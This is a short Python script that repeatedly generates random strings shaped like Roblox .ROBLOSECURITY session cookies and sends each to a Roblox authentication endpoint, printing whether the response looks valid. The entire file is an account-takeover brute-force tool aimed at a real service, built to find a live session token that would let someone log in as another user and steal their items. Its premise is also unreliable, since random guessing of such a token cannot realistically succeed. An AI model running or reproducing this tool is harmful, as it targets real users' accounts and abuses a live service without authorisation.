import requests
import time
import random
while True:
  valid_letters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890'
  rancookie = ''.join((random.choice(valid_letters) for i in range(1356)))
  finalcookie = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_" + rancookie
  headers = {
        'Cookie': '.ROBLOSECURITY=' + finalcookie
    }
  response = requests.get('https://auth.roblox.com/v1/auth/metadata', headers=headers)
  if response.status_code == 200:
    print("Valid")
  else:
    print("Invalid")
